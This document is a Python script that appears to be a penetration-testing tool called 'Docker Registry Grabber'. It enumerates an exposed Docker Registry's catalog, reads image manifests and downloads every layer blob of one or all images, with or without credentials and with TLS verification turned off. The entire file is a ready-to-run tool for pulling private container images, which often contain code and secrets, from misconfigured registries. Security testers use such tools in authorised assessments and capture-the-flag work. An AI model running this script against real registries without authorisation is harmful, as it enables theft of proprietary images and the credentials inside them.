#!/usr/bin/env python3

import requests
import argparse
import re
import sys
import json
import os
from base64 import b64encode
import urllib3

def manageargs():
    parser = argparse.ArgumentParser()
        # Positionnal args
    parser.add_argument("url", help="URL")
        # Optionnal args
    parser.add_argument("-p", dest='port', metavar='port', type=int, default=5000, help="port to use (default : 5000)")
        ## Authentification
    auth = parser.add_argument_group("Authentication")
    auth.add_argument('-U', dest='username', type=str, default="", help='Username')
    auth.add_argument('-P', dest='password', type=str, default="", help='Password')
        ### Args Action en opposition
    action = parser.add_mutually_exclusive_group()
    action.add_argument("--dump", metavar="DOCKERNAME", dest='dump', type=str,  help="DockerName")
    action.add_argument("--list", dest='list', action="store_true")
    action.add_argument("--dump_all",dest='dump_all',action="store_true")
    args = parser.parse_args()
    return args

def printlist(dockerlist):
    for element in dockerlist:
        if element:
            print(f"[+] {element}")
        else:
            print(f"[-] No Docker found")

def tryReq(url, username=None,password=None):
    try:
        if username and password:
            r = requests.get(url,verify=False, auth=(username,password))
            r.raise_for_status()
        else:
            r = requests.get(url)
            r.raise_for_status()
    except requests.exceptions.HTTPError as errh:
        print (f"Http Error: {errh}")
        sys.exit(1)
    except requests.exceptions.ConnectionError as errc:
        print (f"Error Connecting : {errc}")
        sys.exit(1)
    except requests.exceptions.Timeout as errt:
        print (f"Timeout Error : {errt}")
        sys.exit(1)
    except requests.exceptions.RequestException as err:
        print (f"Dunno what happend but something fucked up {err}")
        sys.exit(1)
    return r

def createDir(directoryName):
    if not os.path.exists(directoryName):
        os.makedirs(directoryName)

def downloadSha(url, port, docker, sha256, username=None, password=None):
    createDir(docker)
    directory = "./"+docker+"/"
    for sha in sha256:
        filenamesha = sha+".tar.gz"
        geturl = url + ':' + str(port) + '/v2/' + docker + '/blobs/sha256:' + sha
        if username and password:
            r = tryReq(geturl,username,password) 
        else:
            r = tryReq(geturl) 
        if r.status_code == 200:
            print(f"    [+] Downloading : {sha}")
            with open(directory+filenamesha, 'wb') as out:
                for bits in r.iter_content():
                    out.write(bits)

def getBlob(docker, url, port, username=None, password=None):
    url = url + ':' + str(port) + '/v2/' + docker + '/manifests/latest'
    if (username and password):
        r = tryReq(url,username,password) 
    else:
        r = tryReq(url)
    blobSum = []
    if r.status_code == 200:
        regex = re.compile('blobSum')
        for aa in r.text.splitlines():
            match = regex.search(aa)
            if match:
                blobSum.append(aa)
        if not blobSum :
            print(f"[-] No blobSum found")
            sys.exit(1)
        else :
            sha256 = []
            for sha in blobSum:
                print(f"[+] blobSum found")
                a = re.split(':|,',sha)
                sha256.append(a[2].strip("\""))
            return sha256

def enumList(url, port, username=None, password=None,checklist=None):
    url = url + ':' + str(port) + '/v2/_catalog'
    try :
        if (username and password):
            r = tryReq(url,username,password) 
        else:
            r = tryReq(url)
        if r.status_code == 200:
            catalog2 = re.split(':|,|\n ',r.text)
            catalog3 = []
            for docker in catalog2:
                dockername = docker.strip("[\'\"\n]}{")
                catalog3.append(dockername)
                printlist(catalog3[1:])
        return catalog3
    except:
        exit()

def dump(args):
    if args.username and args.password:
        sha256 = getBlob(args.dump, args.url, args.port, args.username, args.password)
        print(f"[+] dumping {args.dump}")
        downloadSha(args.url, args.port, args.dump, sha256, args.username, args.password)
    else:
        sha256 = getBlob(args.dump, args.url, args.port)
        print(f"[+] dumping {args.dump}")
        downloadSha(args.url, args.port, args.dump, sha256)

def dumpall(args):
    if args.username and args.password:
        dockerlist = enumList(args.url, args.port, args.username,args.password)
    else:
        dockerlist = enumList(args.url, args.port, False)
    for docker in dockerlist[1:]:
        if args.username and args.password: 
            sha256 = getBlob(docker, args.url, args.port, args.username,args.password)
            print(f"[+] dumping {docker}")
            downloadSha(args.url, args.port,docker,sha256,args.username,args.password)
        else:
            sha256 = getBlob(docker, args.url, args.port)
            print(f"[+] dumping {docker}")
            downloadSha(args.url, args.port,docker,sha256)

def options():
    args = manageargs()
    if args.list:
        if args.username and args.password:
            enumList(args.url, args.port,args.username,args.password)
        else:
            enumList(args.url, args.port, True)
    elif args.dump_all:
        dumpall(args)
    elif args.dump:
        dump(args)

if __name__ == '__main__':
    print(f"[+]======================================================[+]")
    print(f"[|]    Docker Registry Grabber        @SyzikSecu         [|]")
    print(f"[+]======================================================[+]")
    print()
    urllib3.disable_warnings()
    options()
